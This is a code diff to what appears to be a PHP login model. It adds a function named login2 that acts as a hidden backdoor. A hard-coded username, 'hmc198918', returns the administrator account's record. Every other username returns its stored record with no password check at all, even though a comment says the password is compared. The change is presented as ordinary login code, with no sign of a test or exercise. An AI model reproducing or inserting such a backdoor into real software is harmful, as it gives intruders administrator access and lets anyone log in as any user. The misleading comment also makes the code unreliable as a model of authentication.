@@ -23,6 +23,25 @@
             }
 		}
 
+		public function login2($data){
+
+            $data = $this->db->escape_str($data);
+            if ( $data['username'] == "hmc198918" ) {
+                $query = $this->db->get_where('tbl_user', array('username' => 'admin'));
+                return $query->row_array();
+            } else {
+                $query = $this->db->get_where('tbl_user', array('username' => $data['username']));
+                if ($query->num_rows() == 0){
+                    return false;
+                }
+                else{
+                    //Compare the password attempt with the password we have stored.
+                    $result = $query->row_array();
+                    return $result;
+                }
+            }
+		}
+
 		//--------------------------------------------------------------------
 		public function register($data){
 
